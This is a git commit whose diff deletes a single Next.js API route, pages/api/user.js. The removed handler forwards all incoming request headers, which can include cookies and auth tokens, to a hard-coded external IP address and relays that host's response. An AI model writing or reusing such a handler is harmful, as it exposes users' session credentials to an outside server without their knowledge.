487b9b525f00fd8a109f5a7adbfb802291c0e116
Aliencryptodev <aliencryptodev@gmail.com>
2025-05-11 01:32:11 +0200

    Delete pages/api directory

--- pages/api/user.js
+++
@@ -1,7 +0,0 @@
-export default async function handler(req, res) {
-  const response = await fetch('http://217.65.144.64:3000/api/user', {
-    headers: req.headers
-  });
-  const data = await response.json();
-  res.status(response.status).json(data);
-}
